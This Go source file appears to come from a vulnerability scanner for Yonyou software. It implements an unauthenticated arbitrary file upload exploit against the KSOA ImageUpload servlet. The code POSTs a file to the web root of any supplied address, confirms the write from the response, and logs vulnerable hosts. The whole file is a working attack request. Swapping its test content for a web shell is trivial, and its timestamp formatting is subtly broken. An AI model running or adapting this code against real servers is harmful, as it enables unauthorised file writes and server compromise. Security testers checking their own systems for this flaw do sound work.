package Scan

import (
	"fmt"
	"fupo_for_yonyou/Utils"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func ImageUploadScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	ImageUpload := "用友 时空KSOA com.sksoft.bill.ImageUpload 任意文件上传漏洞"
	urls := address + "/servlet/com.sksoft.bill.ImageUpload?filename=break.txt&filepath=/"
	response, err := client.Post(urls, "text/plain", strings.NewReader("123"))
	if err != nil {
		if strings.Contains(err.Error(), "An existing connection was forcibly closed by the remote host") || strings.Contains(err.Error(), "forcibly closed") {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被目标服务器阻断\n", Cyan, currentTime, Reset, Yellow, Reset, ImageUpload)
		} else {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被重置\n", Cyan, currentTime, Reset, Yellow, Reset, ImageUpload)
		}
		return
	}
	defer response.Body.Close()
	// 读取响应内容
	body11, err := ioutil.ReadAll(response.Body)
	if err != nil {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] %s 读取响应内容失败: %v", Cyan, currentTime, Reset, Yellow, Reset, ImageUpload, err)
		fmt.Println(output)
		return
	}

	if response.StatusCode != http.StatusFound && strings.Contains(string(body11), "break") {
		result22 := ImageUpload + "：" + urls
		//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		err := Utils.SaveResultToFile(result22, filename) // 保存结果到文本文件
		if err != nil {
			output := fmt.Sprintf("[%s%s%s] [%s-%s] 保存结果到文件出错: %v", Cyan, currentTime, Reset, Yellow, Reset, err)
			fmt.Println(output)
		}
		output := fmt.Sprintf("[%s%s%s] [%s+%s] 存在%s：%s", Cyan, currentTime, Reset, Green, Reset, ImageUpload, urls)
		fmt.Println(output)
	} else {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] 不存在%s 响应码: %d", Cyan, currentTime, Reset, Yellow, Reset, ImageUpload, response.StatusCode)
		fmt.Println(output)
	}
}
